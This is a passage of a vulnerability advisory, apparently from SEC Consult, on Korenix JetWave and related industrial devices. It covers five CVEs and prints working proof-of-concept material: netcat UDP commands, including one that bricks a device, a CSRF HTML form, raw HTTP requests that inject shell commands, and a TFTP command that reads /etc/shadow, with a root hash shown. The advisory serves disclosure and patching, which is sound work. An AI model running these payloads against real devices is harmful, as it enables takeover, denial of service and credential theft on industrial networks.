Business recommendation:
------------------------
The vendor provides an updated firmware which should be installed immediately.

SEC Consult recommends to perform a thorough security review conducted by
security professionals to identify and resolve potential further critical
security issues.


Vulnerability overview/description:
-----------------------------------
1) Unauthenticated Device Administration (CVE-2020-12500)
Korenix, Westermo (members of the Beijer Group) and Comtrol (Pepperl+Fuchs) are
sharing a partially similar firmware base for the industrial devices. They can
be managed via a Windows client program called "Korenix View" or "Jet View".

This program communicates in plaintext via UDP. All messages that are sent to
the device are broadcast in the whole subnet and the answers from the devices
are sent back via broadcast too.
The older version of this management program, called "cmd-server2", can be
controlled without a password. Analyzing the newer version, called
"jetviewd", indicates that some kind of password can be set. But this is not
part of the default configuration.

Actions that can be done via this daemon, listening on UDP port 5010, are:
  * Modifying networking settings (IP, netmask, gateway)
  * Initiating self tests and blink LEDs on the device
  * Triggering download and upload of configuration files (via TFTP)
  * Triggering uploads of new firmware and bootloader files (via TFTP)

The device can also be bricked via this daemon so that it is necessary to press
the reset button and re-configure the settings.


2) Cross-Site Request Forgery (CSRF) (CVE-2020-12502)
The web interface, that is used to set all configurations, is vulnerable to
cross-site request forgery attacks. An attacker can change settings via this
way by luring the victim to a malicious website.


3) Multiple Authenticated Command Injections (CVE-2020-12503)
Multiple command injection vulnerabilities were found on the device series
"JetWave".

They are partially sharing the same firmware base. Therefore, the payloads to
exploit those command injections are similar. Due to the lack of CSRF
protection, an attacker can execute arbitrary commands on the device by luring
the victim to click on a malicious link.


4) Hidden OS Web-Shell Interface (CVE-2021-39280)
The endpoint /syscmd.asp in the web interface of the devices contains an
undocumented web-shell that can be used to invoke system-commands as root
after authentication.

It seems that this is part of the used SDK and a leftover artifact.

In combination with the missing CSRF protection, this vulnerability poses a
higher risk.


5) Arbitrary Unauthenticated TFTP Actions (CVE-2020-12504)
A TFTP service is present on a broad range of devices for firmware-,
bootloader-, and configuration-uploads/downloads. This TFTP server can be
abused to read all files from the system as the daemon runs as root which
results in a password hash exposure via the file /etc/passwd. Write access is
restricted to certain files (configuration, certificates, boot loader,
firmware upgrade) though.

By uploading malicious Quagga config-files an attacker can modify e.g.
IP settings of the device. Malicious firmware and bootloader uploads are
possible too.


Proof of concept:
-----------------
1) Unauthenticated Device Administration (CVE-2020-12500)
All commands can be sent via UDP port 5010.

Device discovery (firmware/bootloader version etc. in response):
echo -e "\x00\x00\x00\x07\x00\x00\x00\x04\x00\x00\x00\x01" | nc -u $IP 5010

Blink with leds:
echo -e "\x00\x00\x00\x5b\x00\x00\x00\x01\x01" | nc -u $IP 5010

Permanent denial of service. The device is only available after pressing the
reset button to load the default config:
echo -e "\x00\x00\x00\x1f\x01\x01\x01\x04\x01\x01\x01\x01" | nc -u $IP 5010

Present on:
  * Korenix JetWave (Multiple devices)


2) Cross-Site Request Forgery (CSRF) (CVE-2020-12502)
The following CSRF PoC can be used to ping 127.0.0.1. All other actions in the
context of the menu, like uploading config files, can be done in the same way:
-------------------------------------------------------------------------------
<html>
   <body>
   <script>history.pushState('', '', '/')</script>
     <form action="http://$IP/goform/formping" method="POST">
       <input type="hidden" name="PingIPAddress" value="127.0.0.1" />
       <input type="hidden" name="submit-url" value="/toolping.asp" />
       <input type="hidden" name="Submit" value="Ping" />
       <input type="submit" value="Submit request" />
     </form>
   </body>
</html>
-------------------------------------------------------------------------------


3) Multiple Authenticated Command Injections (CVE-2020-12503)
At least two command injections are present in the default web interface. It is
likely that more such vulnerabilities are present on the device.

3.1) Semi-Blind Command Injection
The following command injection works on the devices:
  * Korenix JetWave (Multiple devices)

The ping functionality in the web interface can be abused to inject system
commands in a semi-blind way. Two requests must be sent to the service to
retrieve the output of the command injection.

The first request is a POST request to the endpoint /goform/formping:
-------------------------------------------------------------------------------
POST /goform/formping HTTP/1.1
Host: $IP
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 57
Connection: close
Cookie: -common-web-session-=::webs.session::9c10b4b1b22063e7fcba5369ff86e779
Upgrade-Insecure-Requests: 1

PingIPAddress=;id;&submit-url=%2Ftoolping.asp&Submit=Ping
-------------------------------------------------------------------------------
This request triggers the actual command injection in a blind way. The output
can be fetched from the system by using the following GET request after
triggering the previous POST request:
-------------------------------------------------------------------------------
GET //toolping.asp HTTP/1.1
Host: $IP
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: -common-web-session-=::webs.session::9c10b4b1b22063e7fcba5369ff86e779
Upgrade-Insecure-Requests: 1
-------------------------------------------------------------------------------


3.2) Blind Command Injection
The following command injection works on the devices:
  * Korenix JetWave (Multiple devices)

The configuration upload via TFTP in the web interface can be abused to inject
system commands in a blind way.

The request is a POST request to the endpoint /goform/formTFTPLoadSave:
-------------------------------------------------------------------------------
POST /goform/formTFTPLoadSave HTTP/1.1
Host: $IP
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 121
Connection: close
Cookie: ui_language=en_US; -common-web-session-=::webs.session::f6070212ccae758d7d247fb8e2c52cd7
Upgrade-Insecure-Requests: 1

submit-url=%2Fmgmtsaveconf.asp&ip_address=127.0.0.1;ping 192.168.1.1;&file_name=ap.conf&tftp_action=load&tftp_config=Submit
-------------------------------------------------------------------------------


4) Hidden OS Web-Shell Interface (CVE-2021-39280)
The endpoint /syscmd.asp can be accessed after successful login. It can be used
to execute system commands directly as root.

Present on:
  * Korenix JetWave 2212X
  * Korenix JetWave 2212S
  * Korenix JetWave 2212G
  * Korenix JetWave 2311
  * Korenix JetWave 3220
  * Korenix JetWave 3420


5) Arbitrary TFTP Actions (CVE-2020-12504)
The Linux TFTP client was used to download files from the system using
absolute paths. Uploads were only possible on existing paths like:
/home/Quagga.conf
/home/bootloader.bin

To download the /etc/passwd file from the system, the following
command was invoked:

[user@...alhost ~]$ tftp -m binary <Target-IP> -c get /etc/shadow
[user@...alhost ~]$ cat shadow  root:$1$$zdlNHiCDxYDfeF4MZL.H3/:10933:0:99999:7:::

Present on:
  * Korenix JetWave (Multiple devices)

The vulnerabilities 1), 2), 3), 4) and 5) were manually verified on an
emulated device by using the MEDUSA scalable firmware runtime.
